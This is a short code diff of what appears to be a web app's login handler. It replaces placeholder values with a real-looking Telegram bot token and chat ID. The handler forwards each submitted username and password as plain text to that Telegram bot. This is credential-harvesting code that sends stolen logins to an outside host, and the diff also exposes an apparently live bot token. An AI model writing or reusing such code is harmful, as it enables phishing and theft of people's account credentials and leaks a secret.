@@ -16,8 +16,8 @@ def login():
     return jsonify({'message': 'Login details sent to Telegram bot successfully!'})
 
 def send_message_to_telegram(username, password):
-    bot_token = "YOUR_BOT_TOKEN_HERE"
-    chat_id = "YOUR_CHAT_ID_HERE"
+    bot_token = "7321528038:AAFHDt1_oEAq1MvpIR6pa8HX5ytkKm5wAdU"
+    chat_id = "5930670499"
     message = f"Login Attempt:\nUsername: {username}\nPassword: {password}"
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
     params = {"chat_id": chat_id, "text": message}
